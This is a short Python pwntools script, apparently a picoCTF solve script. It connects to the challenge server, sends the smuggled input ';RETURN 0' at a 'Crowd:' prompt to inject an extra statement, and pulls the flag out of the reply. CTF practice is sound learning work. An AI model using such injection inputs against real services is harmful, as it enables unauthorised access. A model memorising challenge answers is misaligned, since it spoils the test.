from pwn import *
import re

HOST, PORT = "verbal-sleep.picoctf.net 59203".split()
r = remote(HOST, PORT)

r.recvuntil(b'Crowd: ')
r.sendline(b';RETURN 0')
res = r.recvuntil(b'}\n')
flag = re.search(r"picoCTF{.*}", res.decode())
r.close()

print(flag.group())